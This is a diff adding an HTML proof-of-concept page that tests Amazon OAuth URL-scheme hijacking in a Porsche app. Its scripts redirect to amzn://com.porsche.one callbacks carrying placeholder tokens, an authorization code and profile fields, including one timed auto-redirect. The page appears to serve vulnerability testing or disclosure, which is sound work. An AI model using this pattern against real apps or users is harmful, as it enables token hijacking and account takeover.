@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Porsche Amazon OAuth Test</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; }
+        .button { background: #ff9900; color: white; padding: 15px 25px; border: none; border-radius: 5px; cursor: pointer; margin: 10px; }
+        .button:hover { background: #e68900; }
+        .section { border: 1px solid #ddd; padding: 20px; margin: 20px 0; border-radius: 5px; }
+        .warning { color: #d93025; font-weight: bold; }
+        .status { margin-top: 10px; padding: 10px; background: #f0f0f0; border-radius: 5px; font-size: 14px; }
+        .amazon-orange { color: #ff9900; }
+    </style>
+</head>
+<body>
+    <h1>🔒 Porsche Amazon OAuth Security Test</h1>
+    
+    <div class="section">
+        <h3>Test 1: Amazon OAuth Token Intercept</h3>
+        <p>Simulates Amazon OAuth return with access token:</p>
+        <button class="button" onclick="triggerOAuthIntercept()">
+            Trigger Amazon OAuth Return
+        </button>
+        <div class="status" id="status1">Ready</div>
+    </div>
+
+    <div class="section">
+        <h3>Test 2: Auto-Redirect Attack (3s delay)</h3>
+        <p>Simulates malicious auto-redirect after Amazon login:</p>
+        <button class="button" onclick="startAutoRedirect()">
+            Start Auto Redirect
+        </button>
+        <div id="countdown"></div>
+        <div class="status" id="status2">Ready</div>
+    </div>
+
+    <div class="section">
+        <h3>Test 3: Profile Data Theft</h3>
+        <p>Simulates stealing user profile data via Amazon OAuth:</p>
+        <button class="button" onclick="triggerProfileTheft()">
+            Steal Profile Data
+        </button>
+        <div class="status" id="status3">Ready</div>
+    </div>
+
+    <div class="warning">
+        ⚠️ Security POC: Demonstrates Amazon OAuth scheme hijacking vulnerability
+    </div>
+
+    <script>
+        function updateStatus(testNum, message) {
+            document.getElementById('status' + testNum).innerHTML = message;
+            console.log('Test ' + testNum + ': ' + message);
+        }
+
+        function triggerOAuthIntercept() {
+            updateStatus(1, "Triggering Amazon OAuth intercept...");
+            // Amazon OAuth return with access token
+            window.location.href = "amzn://com.porsche.one#access_token=amzn1.oa2-POC-TOKEN-123456789&token_type=bearer&expires_in=3600";
+            
+            setTimeout(() => {
+                updateStatus(1, "Completed - Amazon OAuth token intercepted");
+            }, 1000);
+        }
+
+        function triggerProfileTheft() {
+            updateStatus(3, "Triggering profile data theft...");
+            
+            // Simulate OAuth return with user data
+            window.location.href = "amzn://com.porsche.one#access_token=amzn1.oa2-POC-PROFILE-98765&user_id=A3POCEXAMPLE123&email=user%40poc.com&name=Test%20User";
+            
+            setTimeout(() => {
+                updateStatus(3, "Profile data intercept triggered");
+            }, 1000);
+        }
+
+        function startAutoRedirect() {
+            let countdown = 3;
+            const countdownEl = document.getElementById('countdown');
+            countdownEl.innerHTML = `Redirecting in ${countdown} seconds...`;
+            updateStatus(2, "Starting countdown...");
+            
+            const timer = setInterval(() => {
+                countdown--;
+                countdownEl.innerHTML = `Redirecting in ${countdown} seconds...`;
+                
+                if (countdown <= 0) {
+                    clearInterval(timer);
+                    updateStatus(2, "Auto-redirecting to malicious app...");
+                    
+                    // Amazon OAuth with authorization code
+                    window.location.href = "amzn://com.porsche.one?code=A3POC-AUTH-CODE-XYZ123&state=security_token%3D138r5719ru3e1%26action%3Dlogin";
+                }
+            }, 1000);
+        }
+
+        // Debug all attempts
+        window.onerror = function(msg, url, lineNo, columnNo, error) {
+            console.error('Error:', msg, 'at', lineNo, ':', columnNo);
+            return false;
+        }
+    </script>
+</body>
+</html>
